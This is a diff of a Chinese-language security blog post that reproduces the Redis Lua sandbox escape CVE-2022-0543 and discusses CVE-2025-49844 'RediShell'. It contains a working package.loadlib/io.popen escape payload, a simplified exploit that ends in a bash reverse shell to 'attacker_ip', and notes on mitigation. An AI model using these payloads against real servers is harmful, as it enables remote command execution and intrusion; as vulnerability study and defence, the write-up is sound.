@@ -5,51 +5,27 @@ tags: []
 category: 漏洞
 draft: false
 ---
-
-
 ## CVE-2022-0543 Redis沙盒逃逸漏洞复现
 
-
-
-* ###  漏洞成因：
+* ### 漏洞成因：
 
    redis作为一个键值存储数据库，在西方小公司广泛被使用，而由于它下载默认为无密码，一旦开放外网连接，暴露在公网中时，就可以被直接连接到redis-cli终端
 
-
-
    \`redis-cli -h your_ip\`
-
-
 
    而redis终端采用lua VM作为输入的语言，lua（基于C语言开发的一种轻量级高效的脚本语言，往往有很多条命令做成一个单元进行执行），lua脚本在执行时的安全由lua沙箱负责
 
-
-
    lua沙箱如何确保脚本不会执行危害到系统的命令，它移除了以下所有可能访问外部系统资源的库和函数,只保留了纯计算型、不会与外部系统交互的安全库
-
-
 
 >   `` `package 库：完全移除。这是最关键的一步，因为它包含了 loadlib，能够动态加载 C 扩展，是沙箱逃逸的最大威胁` ``
 >
-> ``
+> `` `io 库：完全移除。防止文件读写和执行系统命令（通过 popen）` ``
 >
-> ``   `io 库：完全移除。防止文件读写和执行系统命令（通过 popen）` ``
+> `` `os 库：完全移除。防止执行系统命令（如 os.execute）、删除文件等` ``
 >
-> ``
+> `` `debug 库：完全移除。防止其用于 introspection 和修改上值，从而绕过沙箱` ``
 >
-> ``   `os 库：完全移除。防止执行系统命令（如 os.execute）、删除文件等` ``
->
-> ``
->
-> ``   `debug 库：完全移除。防止其用于 introspection 和修改上值，从而绕过沙箱` ``
->
-> ``
->
-> ``   `loadfile / dofile：这些独立的函数也被移除，防止从文件系统加载额外的 Lua 代码` ``
-
-
-
-
+> `` `loadfile / dofile：这些独立的函数也被移除，防止从文件系统加载额外的 Lua 代码` ``
 
  所以我们要执行危险的命令（例如：获取系统权限）就必须要绕开lua沙箱的限制，在本漏洞中由于早期版本的疏忽，开发者没有移除package变量，导致用户可以通过package.loadlib()导入自己所需要的库可以执行危险命令，从而逃离沙箱的限制
 
@@ -63,45 +39,29 @@ local res = f:read("*a"); f:close();
 return res' 0
 ```
 
-
-
    我们将这部分代码进行分开讲解
-
-
 
    首先lua脚本使用eval进行写入，我们可以禁用这种类型的命令来避免被写入攻击脚本（有时可面临需要无法禁用）
 
-
-
    作为前文提到的package首先登场，它的作用为加载lua的官方库，使其可以支持使用外部库的命令
 
-``   `local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");` ``
-
-
+`` `local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io");` ``
 
    我们使用io作为io库表，用其承接我们需要执行的命令，在io.open()中
 
-``   `local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0` ``
-
-
+`` `local io = io_l(); local f = io.popen("id", "r"); local res = f:read("*a"); f:close(); return res' 0` ``
 
    至此攻击脚本就结束，很简洁的攻击方式却能达到十分危险的效果
 
 * ### 具体复现
 
-
-
    为了节省篇幅，具体复现一笔带过，如果需要查阅请前往<https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.zh-cn.md>进行详细的了解。
-
 * ### 漏洞修复
 
   漏洞可以从两方面进行修复：以非root权限运行redis、禁用package变量
 
   以非root权限运行redis时就可以避免绕过沙箱就拥有了root权限
 * 禁用package变量就可以直接解决问题的根源
-
-
-
 
 ## CVE-2025-49844"RediShell"
 
@@ -129,7 +89,6 @@ return res' 0
   collectgarbage()
   -- 利用UAF漏洞执行系统命令
   os.execute('bash -i >& /dev/tcp/attacker_ip/4444 0>&1')
-
   ```
 
   上述只是一个简化的攻击代码，在真实场景中往往需要更多的处理\
